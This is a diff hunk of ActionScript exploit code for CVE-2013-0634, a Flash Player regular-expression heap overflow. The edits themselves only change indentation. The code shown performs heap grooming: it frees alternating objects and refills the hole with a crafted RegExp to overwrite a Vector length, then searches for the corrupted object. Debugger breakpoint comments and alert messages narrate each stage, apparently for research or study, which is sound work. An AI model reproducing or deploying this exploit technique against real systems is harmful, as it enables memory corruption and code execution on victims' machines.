@@ -25,15 +25,14 @@ package
             // Set a processor breakpoint using ba
             // ba w4 XXXXXXXX "dD XXXXXXXX L3; dc XXXXXXXX L70;"
             objHeaps[999][0] = 11111111; // break
-
-			
-			ExternalInterface.call('alert', 'Leaving the hole: freeing the heap');
+            
+            ExternalInterface.call('alert', 'Leaving the hole: freeing the heap');
             for (i = 1000; i < 3000; i+=2) {
                 objHeaps[i] = null;
             }
             objHeaps[999][0] = 22222222; // break
 
-			ExternalInterface.call('alert', 'CVE-2013-0634: Boom!');
+            ExternalInterface.call('alert', 'CVE-2013-0634: Boom!');
             // CVE-2013-0634: Adobe Flash Player Regular Expression Heap Overflow
             // Refill a vulnerable object into the freed memory 
             // Boom! overwrite length of vector.<Number> object
@@ -41,7 +40,7 @@ package
             var regexp:RegExp = new RegExp(pattern, "")
             objHeaps[999][0] = 33333333; // break
 
-			ExternalInterface.call('alert', 'Find an object which is modified');
+            ExternalInterface.call('alert', 'Find an object which is modified');
             // Find memory view or crafted object
             for (i = 0; i < 4000; i++) {
                 try {
@@ -51,13 +50,13 @@ package
             }
             if (i == 4000) { 
                 // heap feng-shui failed
-				ExternalInterface.call('alert', 'Error: heap feng-shui failed');
+                ExternalInterface.call('alert', 'Error: heap feng-shui failed');
                 return;
             }
 
             // Found it!
             objHeaps[999][2] = i;
-			
+            
             objHeaps[999][0] = 44444444; // break
 
         }
